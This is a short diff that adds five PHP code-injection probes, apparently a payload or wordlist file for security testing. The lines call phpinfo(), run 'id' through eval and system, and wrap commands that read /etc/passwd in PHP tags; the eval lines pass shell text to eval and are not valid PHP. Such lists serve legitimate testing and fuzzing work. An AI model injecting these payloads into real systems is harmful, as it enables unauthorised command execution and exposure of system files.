@@ -1,0 +1,5 @@
+phpinfo()
+eval('id')
+system('id')
+<?php eval('cat /etc/passwd');?>
+<?php system('cat /etc/passwd');?>
